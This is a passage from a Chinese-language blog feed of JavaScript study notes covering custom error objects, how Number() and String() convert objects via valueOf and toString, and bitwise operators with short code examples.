id="EvalError-对象"><a href="#EvalError-对象" class="headerlink" title="EvalError 对象"></a>EvalError 对象</h3><blockquote><p><code>eval</code>函数没有被正确执行时，会抛出<code>EvalError</code>错误。该错误类型已经不再使用了，只是为了保证与以前代码兼容，才继续保留。</p></blockquote><h1 id="自定义错误"><a href="#自定义错误" class="headerlink" title="自定义错误"></a>自定义错误</h1><blockquote><p>除了 JavaScript 原生提供的七种错误对象，还可以定义自己的错误对象。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">UserError</span>(<span class="params">message</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">message</span> = message || <span class="string">&#x27;默认信息&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;UserError&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">UserError</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Error</span>();</span><br><span class="line"><span class="title class_">UserError</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">UserError</span>;</span><br></pre></td></tr></table></figure><p>上面代码自定义一个错误对象<code>UserError</code>，让它继承<code>Error</code>对象。然后，就可以生成这种自定义类型的错误了。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="type">UserError</span>(<span class="string">&#x27;这是自定义的错误！&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><ul><li>Jani Hartikainen, <a href="https://davidwalsh.name/fix-javascript-errors">JavaScript Errors and How to Fix Them</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据类型的转换</title>
      <link href="/Blog/2020/04/21/javascript/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AC%E6%8D%A2/index/"/>
      <url>/Blog/2020/04/21/javascript/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AC%E6%8D%A2/index/</url>
      
        <content type="html"><![CDATA[<h1 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h1><h3 id="1-Number"><a href="#1-Number" class="headerlink" title="1.Number()"></a>1.Number()</h3><blockquote><p>使用 <code>Number</code> 函数，可以将任意类型的值转化成数值。</p><p>下面分成两种情况讨论，一种是参数是原始类型的值，另一种是参数是对象。</p></blockquote><h5 id="原始类型值"><a href="#原始类型值" class="headerlink" title="原始类型值"></a>原始类型值</h5><p><em>原始类型已了解，不再记录</em></p><h5 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h5><p>简单的规则是，<code>Number</code>方法的参数是对象时，将返回<code>NaN</code>，除非是包含单个数值的数组。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Number</span><span class="params">(&#123;a: <span class="number">1</span>&#125;)</span></span> <span class="comment">// NaN</span></span><br><span class="line"><span class="function"><span class="title">Number</span><span class="params">([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span></span> <span class="comment">// NaN</span></span><br><span class="line"><span class="function"><span class="title">Number</span><span class="params">([<span class="number">5</span>])</span></span> <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><p>之所以会这样，是因为Number背后的转换规则比较复杂。</p><p>第一步，调用对象自身的<code>valueOf</code>方法。如果返回原始类型的值，则直接对该值使用<code>Number</code>函数，不再进行后续步骤。</p><p>第二步，如果<code>valueOf</code>方法返回的还是对象，则改为调用对象自身的<code>toString</code>方法。如果<code>toString</code>方法返回原始类型的值，则对该值使用<code>Number</code>函数，不再进行后续步骤。</p><p>第三步，如果<code>toString</code>方法返回的是对象，就报错。</p><p>请看下面的例子。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;x: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="constructor">Number(<span class="params">obj</span>)</span> <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">if</span> (typeof obj.value<span class="constructor">Of()</span><span class="operator"> === </span>&#x27;<span class="keyword">object</span>&#x27;) &#123;</span><br><span class="line">  <span class="constructor">Number(<span class="params">obj</span>.<span class="params">toString</span>()</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="constructor">Number(<span class="params">obj</span>.<span class="params">valueOf</span>()</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，<code>Number</code>函数将<code>obj</code>对象转为数值。背后发生了一连串的操作，首先调用<code>obj.valueOf</code>方法, 结果返回对象本身；于是，继续调用<code>obj.toString</code>方法，这时返回字符串<code>[object Object]</code>，对这个字符串使用<code>Number</code>函数，得到<code>NaN</code>。</p><p>默认情况下，对象的<code>valueOf</code>方法返回对象本身，所以一般总是会调用<code>toString</code>方法，而<code>toString</code>方法返回对象的类型字符串（比如<code>[object Object]</code>）。所以，会有下面的结果。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Number</span><span class="params">(&#123;&#125;)</span></span> <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure><p>如果<code>toString</code>方法返回的不是原始类型的值，结果就会报错。4</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">  valueOf: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">&#123;&#125;</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">&#123;&#125;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Number(obj)</span><br><span class="line">// TypeError: Cannot convert object to primitive value</span><br></pre></td></tr></table></figure><p>上面代码的<code>valueOf</code>和<code>toString</code>方法，返回的都是对象，所以转成数值时会报错。</p><p>从上例还可以看到，<code>valueOf</code>和<code>toString</code>方法，都是可以自定义的。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Number(&#123;</span><br><span class="line">  valueOf: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">// <span class="number">2</span></span><br><span class="line"></span><br><span class="line">Number(&#123;</span><br><span class="line">  toString: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">// <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Number(&#123;</span><br><span class="line">  valueOf: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">2</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">// <span class="number">2</span></span><br></pre></td></tr></table></figure><p>上面代码对三个对象使用<code>Number</code>函数。第一个对象返回<code>valueOf</code>方法的值，第二个对象返回<code>toString</code>方法的值，第三个对象表示<code>valueOf</code>方法先于<code>toString</code>方法执行。</p><h3 id="String"><a href="#String" class="headerlink" title="String()"></a>String()</h3><p><code>String</code>函数可以将任意类型的值转化成字符串，转换规则如下。</p><h5 id="原始类型值-1"><a href="#原始类型值-1" class="headerlink" title="原始类型值"></a>原始类型值</h5><p><em>原始类型以了解，不再记录</em></p><h5 id="对象-1"><a href="#对象-1" class="headerlink" title="对象"></a>对象</h5><p><code>String</code>方法的参数如果是对象，返回一个类型字符串；如果是数组，返回该数组的字符串形式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">String</span><span class="params">(&#123;a: <span class="number">1</span>&#125;)</span></span> <span class="comment">// &quot;[object Object]&quot;</span></span><br><span class="line"><span class="function"><span class="title">String</span><span class="params">([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span></span> <span class="comment">// &quot;1,2,3&quot;</span></span><br></pre></td></tr></table></figure><p><code>String</code>方法背后的转换规则，与<code>Number</code>方法基本相同，只是互换了<code>valueOf</code>方法和<code>toString</code>方法的执行顺序。</p><p>1.先调用对象自身的<code>toString</code>方法。如果返回原始类型的值，则对该值使用<code>String</code>函数，不再进行以下步骤。</p><p>2.如果<code>toString</code>方法返回的是对象，再调用原对象的<code>valueOf</code>方法。如果<code>valueOf</code>方法返回原始类型的值，则对该值使用<code>String</code>函数，不再进行以下步骤。</p><p>3.如果valueOf方法返回的是对象，就报错。</p><p>下面是一个例子。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">String</span><span class="params">(&#123;a: <span class="number">1</span>&#125;)</span></span></span><br><span class="line"><span class="comment">// &quot;[object Object]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="function"><span class="title">String</span><span class="params">(&#123;a: <span class="number">1</span>&#125;.toString()</span></span>)</span><br><span class="line"><span class="comment">// &quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码先调用对象的<code>toString</code>方法，发现返回的是字符串<code>[object Object]</code>，就不再调用<code>valueOf</code>方法了。</p><p>如果<code>toString</code>法和<code>valueOf</code>方法，返回的都是对象，就会报错。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">  valueOf: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">&#123;&#125;</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">&#123;&#125;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">String(obj)</span><br><span class="line">// TypeError: Cannot convert object to primitive value</span><br></pre></td></tr></table></figure><p>下面是通过自定义<code>toString</code>方法，改变返回值的例子。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">String(&#123;</span><br><span class="line">  toString: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">// <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line">String(&#123;</span><br><span class="line">  valueOf: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">// <span class="string">&quot;[object Object]&quot;</span></span><br><span class="line"></span><br><span class="line">String(&#123;</span><br><span class="line">  valueOf: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">2</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="keyword">function</span> <span class="title"></span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">// <span class="string">&quot;3&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码对三个对象使用<code>String</code>函数。第一个对象返回<code>toString</code>方法的值（数值3），第二个对象返回的还是<code>toString</code>方法的值（<code>[object Object]</code>），第三个对象表示<code>toString</code>方法先于<code>valueOf</code>方法执行。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>Axel Rauschmayer, <a href="http://www.2ality.com/2012/01/object-plus-object.html">What is {} + {} in JavaScript?</a></li><li>Axel Rauschmayer, <a href="http://www.2ality.com/2013/04/quirk-implicit-conversion.html">JavaScript quirk 1: implicit conversion of values</a></li><li>Benjie Gillam, <a href="http://www.benjiegillam.com/2013/06/quantum-javascript/">Quantum JavaScript?</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二进制位运算符</title>
      <link href="/Blog/2020/04/20/javascript/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6/index/"/>
      <url>/Blog/2020/04/20/javascript/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%8D%E8%BF%90%E7%AE%97%E7%AC%A6/index/</url>
      
        <content type="html"><![CDATA[<h2 id="二进制或运算符"><a href="#二进制或运算符" class="headerlink" title="二进制或运算符"></a>二进制或运算符</h2><h4 id="二进制或运算符（-）逐位比较两个运算子，两个二进制位之中只要有一个为1，就返回1，否则返回0。"><a href="#二进制或运算符（-）逐位比较两个运算子，两个二进制位之中只要有一个为1，就返回1，否则返回0。" class="headerlink" title="二进制或运算符（|）逐位比较两个运算子，两个二进制位之中只要有一个为1，就返回1，否则返回0。"></a>二进制或运算符（<code>|</code>）逐位比较两个运算子，两个二进制位之中只要有一个为<code>1</code>，就返回<code>1</code>，否则返回<code>0</code>。</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span>| <span class="number">3</span> // <span class="number">3</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>0</code>和<code>3</code>的二进制形式分别是<code>00</code>和<code>11</code>，所以进行二进制或运算会得到<code>11</code>（即<code>3</code>）。</p><p>位运算只对整数有效，遇到小数时，会将小数部分舍去，只保留整数部分。所以，将一个小数与<code>0</code>进行二进制或运算，等同于对该数去除小数部分，即取整数位。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.9</span> | <span class="number">0</span> <span class="regexp">//</span> <span class="number">2</span></span><br><span class="line">-<span class="number">2.9</span> | <span class="number">0</span> <span class="regexp">//</span> -<span class="number">2</span></span><br></pre></td></tr></table></figure><p>需要注意的是，这种取整方法不适用超过32位整数最大值2147483647的数。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2147483649.4</span> <span class="string">| 0;</span></span><br><span class="line"><span class="comment">// -2147483647</span></span><br></pre></td></tr></table></figure><h2 id="二进制与运算符"><a href="#二进制与运算符" class="headerlink" title="二进制与运算符"></a>二进制与运算符</h2><h4 id="二进制与运算符（-amp-）的规则是逐位比较两个运算子，两个二进制位之中只要有一个位为0，就返回0，否则返回1。"><a href="#二进制与运算符（-amp-）的规则是逐位比较两个运算子，两个二进制位之中只要有一个位为0，就返回0，否则返回1。" class="headerlink" title="二进制与运算符（&amp;）的规则是逐位比较两个运算子，两个二进制位之中只要有一个位为0，就返回0，否则返回1。"></a>二进制与运算符（<code>&amp;</code>）的规则是逐位比较两个运算子，两个二进制位之中只要有一个位为<code>0</code>，就返回<code>0</code>，否则返回<code>1</code>。</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span>&amp; <span class="number">3</span> // <span class="number">0</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>0</code>（二进制<code>00</code>）和<code>3</code>（二进制<code>11</code>）进行二进制与运算会得到<code>00</code>（即<code>0</code>）。</p><h2 id="二进制否运算符"><a href="#二进制否运算符" class="headerlink" title="二进制否运算符"></a>二进制否运算符</h2><h4 id="二进制否运算符（-）将每个二进制位都变为相反值（0变为1，1变为0）。它的返回结果有时比较难理解，因为涉及到计算机内部的数值表示机制。"><a href="#二进制否运算符（-）将每个二进制位都变为相反值（0变为1，1变为0）。它的返回结果有时比较难理解，因为涉及到计算机内部的数值表示机制。" class="headerlink" title="二进制否运算符（~）将每个二进制位都变为相反值（0变为1，1变为0）。它的返回结果有时比较难理解，因为涉及到计算机内部的数值表示机制。"></a>二进制否运算符（~）将每个二进制位都变为相反值（0变为1，1变为0）。它的返回结果有时比较难理解，因为涉及到计算机内部的数值表示机制。</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="number">3</span> <span class="regexp">//</span> -<span class="number">4</span></span><br></pre></td></tr></table></figure><p>上面表达式对3进行二进制否运算，得到-4。之所以会有这样的结果，是因为位运算时，JavaScript 内部将所有的运算子都转为32位的二进制整数再进行运算。</p><p>3的32位整数形式是<code>00000000000000000000000000000011</code>，二进制否运算以后得到<code>11111111111111111111111111111100</code>。由于第一位（符号位）是1，所以这个数是一个负数。JavaScript 内部采用补码形式表示负数，即需要将这个数减去1，再取一次反，然后加上负号，才能得到这个负数对应的10进制值。这个数减去1等于<code>11111111111111111111111111111011</code>，再取一次反得到<code>00000000000000000000000000000100</code>，再加上负号就是-4。考虑到这样的过程比较麻烦，可以简单记忆成，一个数与自身的取反值相加，等于**-1**。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~ -<span class="number">3</span> <span class="regexp">//</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>上面表达式可以这样算，<code>-3</code>的取反值等于<code>-1</code>减去<code>-3</code>，结果为<code>2</code>。</p><p>对一个整数连续两次二进制否运算，得到它自身。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~<span class="number">3</span> <span class="regexp">//</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>所有的位运算都只对整数有效。二进制否运算遇到小数时，也会将小数部分舍去，只保留整数部分。所以，对一个小数连续进行两次二进制否运算，能达到取整效果。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~~<span class="number">2.9</span> <span class="regexp">//</span> <span class="number">2</span></span><br><span class="line">~~<span class="number">47.11</span> <span class="regexp">//</span> <span class="number">47</span></span><br><span class="line">~~<span class="number">1.9999</span> <span class="regexp">//</span> <span class="number">1</span></span><br><span class="line">~~<span class="number">3</span> <span class="regexp">//</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>使用二进制否运算取整，是所有取整方法中最快的一种。</p><p>对字符串进行二进制否运算，JavaScript 引擎会先调用<code>Number</code>函数，将字符串转为数值。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 相当于~Number(<span class="string">&#x27;011&#x27;</span>)</span><br><span class="line">~<span class="string">&#x27;011&#x27;</span>  <span class="regexp">//</span> -<span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 相当于~Number(<span class="string">&#x27;42 cats&#x27;</span>)</span><br><span class="line">~<span class="string">&#x27;42 cats&#x27;</span> <span class="regexp">//</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 相当于~Number(<span class="string">&#x27;0xcafebabe&#x27;</span>)</span><br><span class="line">~<span class="string">&#x27;0xcafebabe&#x27;</span> <span class="regexp">//</span> <span class="number">889275713</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 相当于~Number(<span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line">~<span class="string">&#x27;deadbeef&#x27;</span> <span class="regexp">//</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>Number</code>函数将字符串转为数值的规则，参见《数据的类型转换》一章。</p><p>对于其他类型的值，二进制否运算也是先用<code>Number</code>转为数值，然后再进行处理。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 相当于 ~Number([])</span><br><span class="line">~[] <span class="regexp">//</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 相当于 ~Number(NaN)</span><br><span class="line">~NaN <span class="regexp">//</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 相当于 ~Number(null)</span><br><span class="line">~null <span class="regexp">//</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="异或运算符（没整懂。。。）"><a href="#异或运算符（没整懂。。。）" class="headerlink" title="异或运算符（没整懂。。。）"></a>异或运算符（没整懂。。。）</h2><h4 id="异或运算（-）在两个二进制位不同时返回1，相同时返回0。"><a href="#异或运算（-）在两个二进制位不同时返回1，相同时返回0。" class="headerlink" title="异或运算（^）在两个二进制位不同时返回1，相同时返回0。"></a>异或运算（<code>^</code>）在两个二进制位不同时返回1，相同时返回0。</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span>^ <span class="number">3</span> // <span class="number">3</span></span><br></pre></td></tr></table></figure><p>上面表达式中，<code>0</code>（二进制<code>00</code>）与<code>3</code>（二进制<code>11</code>）进行异或运算，它们每一个二进制位都不同，所以得到<code>11</code>（即<code>3</code>）。</p><p>“异或运算”有一个特殊运用，连续对两个数<code>a</code>和<code>b</code>进行三次异或运算，<code>a^=b; b^=a; a^=b;</code>，可以<a href="https://en.wikipedia.org/wiki/XOR_swap_algorithm">互换</a>它们的值。这意味着，使用“异或运算”可以在不引入临时变量的前提下，互换两个变量的值。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="attribute">var</span> b = <span class="number">99</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">a</span><span class="regexp"> ^=</span> b, b<span class="regexp"> ^=</span> a, a<span class="regexp"> ^=</span> b;</span><br><span class="line"></span><br><span class="line"><span class="attribute">a</span> // <span class="number">99</span></span><br><span class="line">b // <span class="number">10</span></span><br></pre></td></tr></table></figure><p>这是互换两个变量的值的最快方法。</p><p>异或运算也可以用来取整。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">12</span>.<span class="number">9</span> ^ <span class="number">0</span> // <span class="number">12</span></span><br></pre></td></tr></table></figure><h2 id="左移运算符"><a href="#左移运算符" class="headerlink" title="左移运算符"></a>左移运算符</h2><h4 id="左移运算符（-lt-lt-）表示将一个数的二进制值向左移动指定的位数，尾部补0，即乘以2的指定次方。向左移动的时候，最高位的符号位是一起移动的。"><a href="#左移运算符（-lt-lt-）表示将一个数的二进制值向左移动指定的位数，尾部补0，即乘以2的指定次方。向左移动的时候，最高位的符号位是一起移动的。" class="headerlink" title="左移运算符（&lt;&lt;）表示将一个数的二进制值向左移动指定的位数，尾部补0，即乘以2的指定次方。向左移动的时候，最高位的符号位是一起移动的。"></a>左移运算符（<code>&lt;&lt;</code>）表示将一个数的二进制值向左移动指定的位数，尾部补<code>0</code>，即乘以<code>2</code>的指定次方。向左移动的时候，最高位的符号位是一起移动的。</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> <span class="number">4</span> 的二进制形式为<span class="number">100</span>，</span><br><span class="line"><span class="regexp">//</span> 左移一位为<span class="number">1000</span>（即十进制的<span class="number">8</span>）</span><br><span class="line"><span class="regexp">//</span> 相当于乘以<span class="number">2</span>的<span class="number">1</span>次方</span><br><span class="line"><span class="number">4</span> &lt;&lt; <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line">-<span class="number">4</span> &lt;&lt; <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> -<span class="number">8</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>-4</code>左移一位得到<code>-8</code>，是因为<code>-4</code>的二进制形式是<code>11111111111111111111111111111100</code>，左移一位后得到<code>11111111111111111111111111111000</code>，该数转为十进制（减去1后取反，再加上负号）即为<code>-8</code>。</p><p>如果左移0位，就相当于将该数值转为32位整数，等同于取整，对于正数和负数都有效。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">13.5</span> &lt;&lt; <span class="number">0</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">13</span></span><br><span class="line"></span><br><span class="line">-<span class="number">13.5</span> &lt;&lt; <span class="number">0</span></span><br><span class="line"><span class="regexp">//</span> -<span class="number">13</span></span><br></pre></td></tr></table></figure><p>左移运算符用于二进制数值非常方便。</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">color</span> = &#123;<span class="attribute">r</span>: <span class="number">186</span>, <span class="attribute">g</span>: <span class="number">218</span>, <span class="attribute">b</span>: <span class="number">85</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RGB to HEX</span></span><br><span class="line"><span class="comment">// (1 &lt;&lt; 24)的作用为保证结果是6位数</span></span><br><span class="line"><span class="keyword">var</span> rgb2hex = <span class="function"><span class="keyword">function</span>(<span class="params">r, g, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span> + ((<span class="number">1</span> &lt;&lt; <span class="number">24</span>) + (r &lt;&lt; <span class="number">16</span>) + (g &lt;&lt; <span class="number">8</span>) + b)</span><br><span class="line">    .toString(<span class="number">16</span>) <span class="comment">// 先转成十六进制，然后返回字符串</span></span><br><span class="line">    .substr(<span class="number">1</span>);   <span class="comment">// 去除字符串的最高位，返回后面六个字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rgb2hex(<span class="built_in">color</span>.r, <span 